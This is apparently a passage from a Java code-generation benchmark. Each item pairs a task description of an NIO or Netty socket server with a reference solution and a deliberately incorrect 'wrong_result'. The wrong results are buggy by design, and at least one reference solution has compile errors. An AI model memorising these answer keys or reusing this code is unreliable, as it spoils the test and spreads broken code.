}\n            } catch (Throwable e) {\n                LOGGER.warn(name, e);\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection c = null;\n        while ((c = connectQueue.poll()) != null) {\n            try {\n                c.connect(selector);\n            } catch (Throwable e) {\n                c.error(ErrorCode.ERR_CONNECT_SOCKET, e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        try {\n            if (c.finishConnect()) {\n                clearSelectionKey(key);\n                c.setId(ID_GENERATOR.getId());\n                NIOProcessor processor = nextProcessor();\n                c.setProcessor(processor);\n                processor.postRegister(c);\n            }\n        } catch (Throwable e) {\n            clearSelectionKey(key);\n            c.error(ErrorCode.ERR_FINISH_CONNECT, e);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key.isValid()) {\n            key.attach(null);\n            key.cancel();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static class ConnectIdGenerator {\n        private static final long MAX_VALUE = Long.MAX_VALUE;\n        private long connectId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (connectId >= MAX_VALUE) {\n                    connectId = 0L;\n                }\n                return ++connectId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 20,
    "wrong_result": "public class NIOConnector {\n    private String name;\n    private Selector selector;\n    private BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) {\n        this.name = name;\n        try {\n            selector = Selector.open();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        connectQueue = new LinkedBlockingQueue<>();\n        nextProcessor = 0;\n        connectCount = 0;\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.add(c);\n        selector.wakeup();\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Set<SelectionKey> keys = selector.select();\n                if (keys.isEmpty()) {\n                    connect();\n                } else {\n                    for (SelectionKey key : keys) {\n                        if (key.isValid() && key.isConnectable()) {\n                            finishConnect(key, key.attachment());\n                        } else if (key.isValid() && key.isReadable()) {\n                            // Handle readable\n                        }\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void connect() {\n        while (!connectQueue.isEmpty()) {\n            BackendConnection conn = connectQueue.poll();\n            if (conn == null) break;\n            connectCount++;\n            try {\n                SocketChannel sc = SocketChannel.open();\n                sc.configureBlocking(false);\n                sc.connect(conn.getRemoteAddress());\n                ConnectIdGenerator idGen = new ConnectIdGenerator();\n                long id = idGen.generateId();\n                sc.register(selector, SelectionKey.OP_CONNECT, id);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        SocketChannel sc = (SocketChannel) key.channel();\n        if (sc.isConnectionPending()) {\n            sc.finishConnect();\n        }\n        NIOProcessor processor = nextProcessor();\n        processor.handleConnection(sc, att);\n        clearSelectionKey(key);\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        key.cancel();\n    }\n\n    private NIOProcessor nextProcessor() {\n        NIOProcessor processor = processors[nextProcessor];\n        nextProcessor = (nextProcessor + 1) % processors.length;\n        return processor;\n    }\n\n    static class ConnectIdGenerator {\n        private long value = 0;\n        public synchronized long generateId() {\n            return value++;\n        }\n    }\n}"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Implement a Java class that handles asynchronous socket connections using Java NIO (Non-blocking I/O) to manage incoming connections for a high-availability service. The class should be abstract, allowing subclasses to define specific connection handling logic.\n\nClass Description: AcceptSocketService is an abstract class that extends ServiceThread to provide a non-blocking socket server implementation. It manages incoming socket connections using ServerSocketChannel and Selector, delegating the creation of specific connection handlers to subclasses through an abstract method. The class handles the lifecycle of the server socket, including startup, connection acceptance, and shutdown.\n\nAttributes:\n- socketAddressListen: [SocketAddress] - The address and port to listen for incoming connections\n- serverSocketChannel: [ServerSocketChannel] - The server socket channel for accepting connections\n- selector: [Selector] - The selector for managing multiple non-blocking channels\n- messageStoreConfig: [MessageStoreConfig] - Configuration object containing server settings\n- log: [Logger] - Logger instance for recording events and errors\n\nMethods:\n- AcceptSocketService([MessageStoreConfig messageStoreConfig]) -> [void] - Constructor that initializes the service with configuration\n- beginAccept() -> [void] - Initializes and starts the server socket channel and selector\n- shutdown([boolean interrupt]) -> [void] - Shuts down the service and cleans up resources\n- run() -> [void] - Main service loop that handles incoming connections (inherited from ServiceThread)\n- createConnection([SocketChannel sc]) -> [HAConnection] - Abstract method to be implemented by subclasses for creating connection handlers",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.config.MessageStoreConfig;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\n\nprotected abstract class AcceptSocketService extends ServiceThread {\n    private final SocketAddress socketAddressListen;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private final MessageStoreConfig messageStoreConfig;\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.STORE_LOGGER_NAME);\n\n    public AcceptSocketService(final MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = new InetSocketAddress(messageStoreConfig.getHaListenPort());\n    }\n\n    public void beginAccept() throws Exception {\n        this.serverSocketChannel = ServerSocketChannel.open();\n        this.selector = NetworkUtil.openSelector();\n        this.serverSocketChannel.socket().setReuseAddress(true);\n        this.serverSocketChannel.socket().bind(this.socketAddressListen);\n        if (0 == messageStoreConfig.getHaListenPort()) {\n            messageStoreConfig.setHaListenPort(this.serverSocketChannel.socket().getLocalPort());\n            log.info(\"OS picked up {} to listen for HA\", messageStoreConfig.getHaListenPort());\n        }\n        this.serverSocketChannel.configureBlocking(false);\n        this.serverSocketChannel.register(this.selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void shutdown(final boolean interrupt) {\n        super.shutdown(interrupt);\n        try {\n            if (null != this.serverSocketChannel) {\n                this.serverSocketChannel.close();\n            }\n            if (null != this.selector) {\n                this.selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"AcceptSocketService shutdown exception\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(this.getServiceName() + \" service started\");\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                Set<SelectionKey> selected = this.selector.selectedKeys();\n                if (selected != null) {\n                    for (SelectionKey k : selected) {\n                        if (k.isAcceptable()) {\n                            SocketChannel sc = ((ServerSocketChannel) k.channel()).accept();\n                            if (sc != null) {\n                                log.info(\"HAService receive new connection, \" + sc.socket().getRemoteSocketAddress());\n                                try {\n                                    HAConnection conn = createConnection(sc);\n                                    conn.start();\n                                } catch (Exception e) {\n                                    log.error(\"new HAConnection exception\", e);\n                                    sc.close();\n                                }\n                            }\n                        } else {\n                            log.warn(\"Unexpected ops in select \" + k.readyOps());\n                        }\n                    }\n                    selected.clear();\n                }\n            } catch (Exception e) {\n                log.error(this.getServiceName() + \" service has exception.\", e);\n            }\n        }\n        log.info(this.getServiceName() + \" service end\");\n    }\n\n    protected abstract HAConnection createConnection(final SocketChannel sc) throws IOException;\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "abstract class AcceptSocketService extends ServiceThread {\n    protected final SocketAddress socketAddressListen;\n    protected final ServerSocketChannel serverSocketChannel;\n    protected final Selector selector;\n    protected final MessageStoreConfig messageStoreConfig;\n    protected final Logger log;\n\n    public AcceptSocketService(MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.log = LoggerFactory.getLogger(AcceptSocketService.class);\n        this.socketAddressListen = messageStoreConfig.getSocketAddress();\n        this.serverSocketChannel = ServerSocketChannel.open();\n        this.selector = Selector.open();\n    }\n\n    public void beginAccept() {\n        try {\n            serverSocketChannel.configureBlocking(false);\n            serverSocketChannel.bind(socketAddressListen);\n            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        } catch (IOException e) {\n            log.error(\"Error initializing server socket\", e);\n        }\n    }\n\n    public void shutdown(boolean interrupt) {\n        try {\n            if (serverSocketChannel != null) {\n                serverSocketChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"Error shutting down server\", e);\n        }\n        if (interrupt) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (running) {\n            try {\n                int readyKeys = selector.select();\n                if (readyKeys > 0) {\n                    for (SelectionKey key : selector.selectedKeys()) {\n                        if (key.isAcceptable()) {\n                            ServerSocketChannel ssChan = (ServerSocketChannel) key.channel();\n                            SocketChannel sc = ssChan.accept();\n                            HAConnection conn = createConnection(sc);\n                            sc.configureBlocking(false);\n                            conn.register(selector);\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                log.error(\"Error in service loop\", e);\n            }\n        }\n    }\n\n    protected abstract HAConnection createConnection(SocketChannel sc);\n}"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a non-blocking HTTP server using Java NIO (New I/O) that can handle multiple client connections concurrently. The server should be able to accept new connections, read incoming requests, and write responses asynchronously using separate threads for different operations.\n\nClass Description: NioHttpServer is a multi-threaded HTTP server implementation using Java NIO that handles client connections in a non-blocking manner. It uses three separate selectors for different operations: accepting connections, reading requests, and writing responses.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The selector for accepting new client connections\n- clientReadSelector: Selector - The selector for handling read operations from clients\n- clientWriteSelector: Selector - The selector for handling write operations to clients\n\nMethods:\n- NioHttpServer(int port) -> void - Constructor that initializes the server socket channel and selectors, binds to the specified port, and configures non-blocking mode\n- start() -> void - Starts three separate threads for handling server operations (accepting connections, reading requests, and writing responses)\n- ServerChannelThread(Selector serverSelector, Selector clientReadSelector) -> void - Nested class that handles accepting new client connections and registers them with the read selector\n- ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles reading incoming requests from clients and registers them with the write selector when ready to respond\n- ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles writing responses to clients and registers them back with the read selector when done",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        \n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private static class ServerChannelThread implements Runnable {\n        private Selector serverSelector;\n        private Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (serverSelector.select(1) > 0) {\n                        Set<SelectionKey> set = serverSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n                            if (key.isAcceptable()) {\n                                SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            }\n                            keyIterator.remove();\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientReadChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientReadSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientReadSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isReadable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    clientChannel.read(byteBuffer);\n                                    byteBuffer.flip();\n                                    System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n                                    clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                                } finally {\n                                    keyIterator.remove();\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientWriteChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientWriteSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientWriteSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isWritable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    String msg = \"server channel write: current time mill \" + System.currentTimeMillis();\n                                    byteBuffer.put(msg.getBytes());\n                                    byteBuffer.flip();\n                                    clientChannel.write(byteBuffer);\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                } finally {\n                                    keyIterator.remove();\n                                    key.interestOps(SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public class NioHttpServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) {\n        try {\n            serverSocketChannel = ServerSocketChannel.open();\n            serverSocketChannel.socket().bind(new InetSocketAddress(port));\n            serverSocketChannel.configureBlocking(false);\n            selector = Selector.open();\n            clientReadSelector = Selector.open();\n            clientWriteSelector = Selector.open();\n\n            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private class ServerChannelThread implements Runnable {\n        private final Selector serverSelector;\n        private final Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                int selectedKeys = serverSelector.select();\n                if (selectedKeys > 0) {\n                    for (SelectionKey key : serverSelector.selectedKeys()) {\n                        if (key.isAcceptable()) {\n                            try {\n                                SocketChannel clientChannel = serverSocketChannel.accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        key.cancel();\n                    }\n                }\n            }\n        }\n    }\n\n    private class ClientReadChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                int selectedKeys = clientReadSelector.select();\n                if (selectedKeys > 0) {\n                    for (SelectionKey key : clientReadSelector.selectedKeys()) {\n                        if (key.isReadable()) {\n                            try {\n                                SocketChannel clientChannel = (SocketChannel) key.channel();\n                                ByteBuffer buffer = ByteBuffer.allocate(1024);\n                                clientChannel.read(buffer);\n                                String request = new String(buffer.array());\n                                clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        key.cancel();\n                    }\n                }\n            }\n        }\n    }\n\n    private class ClientWriteChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                int selectedKeys = clientWriteSelector.select();\n                if (selectedKeys > 0) {\n                    for (SelectionKey key : clientWriteSelector.selectedKeys()) {\n                        if (key.isWritable()) {\n                            try {\n                                SocketChannel clientChannel = (SocketChannel) key.channel();\n                                ByteBuffer buffer = ByteBuffer.wrap(\"HTTP/1.1 200 OK\\r\\n\\r\\n\".getBytes());\n                                clientChannel.write(buffer);\n                                clientChannel.unregister(key);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        key.cancel();\n                    }\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously using non-blocking I/O operations.\n\nClass Description: NIOServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) components. It manages multiple client connections efficiently through a single thread using a Selector to monitor events on channels.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that monitors registered channels for I/O events\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop\n- handleAccept(SelectionKey key) -> void - Handles new client connections by accepting the channel and registering it for read operations\n- handleRead(SelectionKey key) -> void - Handles incoming data from clients by reading from the channel and processing the request\n- handleWrite(SelectionKey key) -> void - Handles writing responses back to clients by preparing and sending data through the channel",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        try {\n            while (true) {\n                if (selector.select(1) > 0) {\n                    Set<SelectionKey> set = selector.selectedKeys();\n                    Iterator<SelectionKey> keyIterator = set.iterator();\n\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isAcceptable()) {\n                            handleAccept(key);\n                        } else if (key.isReadable()) {\n                            handleRead(key);\n                        } else if (key.isWritable()) {\n                            handleWrite(key);\n                        }\n                        keyIterator.remove();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((SocketChannel) key.channel());\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String msg = \"server channel write: current time mill\" + System.currentTimeMillis();\n        byteBuffer.put(msg.getBytes());\n        byteBuffer.flip();\n        clientChannel.write(byteBuffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public class NIOServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            int readyKeys = selector.select();\n            if (readyKeys > 0) {\n                for (SelectionKey key : selector.selectedKeys()) {\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    } else if (key.isReadable()) {\n                        handleRead(key);\n                    } else if (key.isWritable()) {\n                        handleWrite(key);\n                    }\n                    selector.selectedKeys().remove(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n        if (bytesRead > 0) {\n            buffer.flip();\n            String request = new String(buffer.array());\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            ByteBuffer responseBuffer = ByteBuffer.wrap(response.getBytes());\n            clientChannel.register(selector, SelectionKey.OP_WRITE, responseBuffer);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer responseBuffer = (ByteBuffer) key.attachment();\n        while (responseBuffer.hasRemaining()) {\n            int bytesWritten = clientChannel.write(responseBuffer);\n            if (bytesWritten == 0) {\n                break;\n            }\n        }\n        if (!responseBuffer.hasRemaining()) {\n            clientChannel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, supporting SSL/TLS encryption and providing methods for server startup and shutdown.\n\nClass Description: BaseHttp2Server is an abstract class that serves as a foundation for building HTTP/2 servers using Netty. It handles SSL/TLS configuration, channel management, and provides basic server lifecycle methods. Concrete implementations must define their own request handlers.\n\nAttributes:\n- sslContext: [SslContext] - SSL/TLS context for secure connections\n- hasReleasedSslContext: [AtomicBoolean] - Tracks whether SSL context resources have been released\n- bootstrap: [ServerBootstrap] - Netty server bootstrap configuration\n- shouldShutDownEventLoopGroup: [boolean] - Flag indicating whether to shutdown event loop group\n- allChannels: [ChannelGroup] - Tracks all active server channels\n\nMethods:\n- BaseHttp2Server([SslContext], [EventLoopGroup]) -> [void] - Constructor that initializes the server with SSL context and optional event loop group\n- addHandlersToPipeline([SSLSession], [ChannelPipeline]) -> [void] - Abstract method to be implemented by subclasses for adding custom handlers to the pipeline\n- start([int]) -> [CompletableFuture<Integer>] - Starts the server on specified port and returns future with bound port number\n- shutdown() -> [CompletableFuture<Void>] - Gracefully shuts down the server and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.ReferenceCounted;\nimport io.netty.util.concurrent.Future;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLSession;\n\nabstract class BaseHttp2Server {\n    private final SslContext sslContext;\n    private final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    private final ServerBootstrap bootstrap;\n    private final boolean shouldShutDownEventLoopGroup;\n    private final ChannelGroup allChannels;\n\n    BaseHttp2Server(final SslContext sslContext, final EventLoopGroup eventLoopGroup) {\n        this.sslContext = sslContext;\n\n        if (this.sslContext instanceof ReferenceCounted) {\n            ((ReferenceCounted) this.sslContext).retain();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n\n        if (eventLoopGroup != null) {\n            this.bootstrap.group(eventLoopGroup);\n            this.shouldShutDownEventLoopGroup = false;\n        } else {\n            this.bootstrap.group(new NioEventLoopGroup(1));\n            this.shouldShutDownEventLoopGroup = true;\n        }\n\n        this.allChannels = new DefaultChannelGroup(this.bootstrap.config().group().next());\n\n        this.bootstrap.channel(ServerChannelClassUtil.getServerSocketChannelClass(this.bootstrap.config().group()));\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(final SocketChannel channel) {\n                final SslHandler sslHandler = sslContext.newHandler(channel.alloc());\n                channel.pipeline().addLast(sslHandler);\n\n                sslHandler.handshakeFuture().addListener(handshakeFuture -> {\n                    if (handshakeFuture.isSuccess()) {\n                        BaseHttp2Server.this.addHandlersToPipeline(sslHandler.engine().getSession(), channel.pipeline());\n                        BaseHttp2Server.this.allChannels.add(channel);\n                    }\n                });\n            }\n        });\n    }\n\n    protected abstract void addHandlersToPipeline(final SSLSession sslSession, final ChannelPipeline pipeline) throws Exception;\n\n    public CompletableFuture<Integer> start(final int port) {\n        final ChannelFuture channelFuture = this.bootstrap.bind(port);\n        this.allChannels.add(channelFuture.channel());\n\n        final CompletableFuture<Integer> startFuture = new CompletableFuture<>();\n\n        channelFuture.addListener((future -> {\n            if (future.isSuccess()) {\n                startFuture.complete(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n            } else {\n                startFuture.completeExceptionally(future.cause());\n            }\n        }));\n\n        return startFuture;\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        final CompletableFuture<Void> shutdownFuture = new CompletableFuture<>();\n        final Future<Void> channelCloseFuture = this.allChannels.close();\n\n        if (this.shouldShutDownEventLoopGroup) {\n            channelCloseFuture.addListener(future ->\n                    BaseHttp2Server.this.bootstrap.config().group().shutdownGracefully());\n\n            this.bootstrap.config().group().terminationFuture().addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            channelCloseFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        }\n\n        return shutdownFuture.thenRun(() -> {\n            if (BaseHttp2Server.this.sslContext instanceof ReferenceCounted) {\n                if (BaseHttp2Server.this.hasReleasedSslContext.compareAndSet(false, true)) {\n                    ((ReferenceCounted) BaseHttp2Server.this.sslContext).release();\n                }\n            }\n        });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
